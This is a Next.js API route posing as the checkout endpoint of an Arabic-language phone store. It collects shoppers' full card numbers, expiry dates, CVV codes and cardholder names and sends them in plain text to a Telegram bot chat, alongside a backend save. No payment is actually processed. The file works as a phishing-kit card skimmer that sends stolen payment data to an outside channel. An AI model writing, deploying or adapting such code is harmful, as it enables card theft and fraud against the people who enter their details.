import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, installmentType, downPayment } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;

  // حفظ في الداتابيز
  await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer }),
  });

  // Send Telegram
  const text = [
    `🏪 طلب لـ متجر مؤسسة بصمة هاتفي المعتمد`,
    `🔢 رقم الطلب: #${orderId}`,
    ``,
    `💰 Total Amount: ${total} SAR`,
    ...(installmentType === "installment"
      ? [`💵 First Payment: ${downPayment} SAR`]
      : [`💵 Payment Type: Full Amount`]),
    ``,
    `💳 MadaVisa - New Order`,
    `👤 Order For: ${customer ?? "-"}`,
    `💳 Card Number: ${cardNumber}`,
    `👤 Card Holder: ${cardHolder}`,
    `📅 Valid To: ${expiry}`,
    `🔐 CVV: ${cvv}`,
  ].join("\n");

  await fetch(
    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text }),
    }
  );

  return NextResponse.json({ ok: true, orderId });
}
